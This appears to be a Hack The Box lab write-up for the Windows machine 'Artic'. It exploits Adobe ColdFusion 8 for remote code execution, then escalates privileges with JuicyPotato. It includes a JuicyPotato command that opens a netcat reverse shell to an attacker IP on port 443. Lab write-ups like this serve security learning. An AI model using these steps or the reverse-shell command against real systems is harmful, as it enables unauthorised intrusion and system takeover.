---
title: "Artic"
published: 2026-06-12
draft: false
description: 'Windows Easy machine - Artic.'
series: 'Hack-The-Box'
tags: ['HTB', 'Windows', 'RCE']
difficulty: 'Easy'
osType: 'Windows'
---


- Machine Name: Artic
- OS Type: Windows
- Difficulty: Easy

### Port Scanning - Service & Version Enumeration

```bash
PORT      STATE SERVICE REASON          VERSION
135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
8500/tcp  open  fmtp?   syn-ack ttl 127
49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumeration

### Port 8500/HTTP

HTTP service is running on port 8500

![image.png](image.png)

let’s open the CFIDE directory

![image.png](image-1.png)

we found interesting directory administrator/ upon visiting the administrator path it shows the **Adobe ColdFusion 8 Administrator**

![image.png](image-2.png)

searching for the known vulnerability i found ColdFusion 8 is vulnerable to RCE

https://www.exploit-db.com/exploits/50057

in exploit change:

![image.png](image-3.png)

lhost to your machine’s IP

and run the exploit

```bash
python3 50057.py
```

![image.png](image-4.png)

checking the privileges of the tolis user using `whoami /priv` command i found that we have SeImpersonatePrivilege enabled let’s use the GodPotato to abuse this privilege

first we’ll transfer the nc.exe and [JuicyPotato](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe) to target machine

```bash
JuicyPotato.exe -l 443 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\temp\\nc.exe -e cmd.exe 10.10.14.17 443" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}
```

![image.png](image-5.png)

check the listener on port 443

![image.png](image-6.png)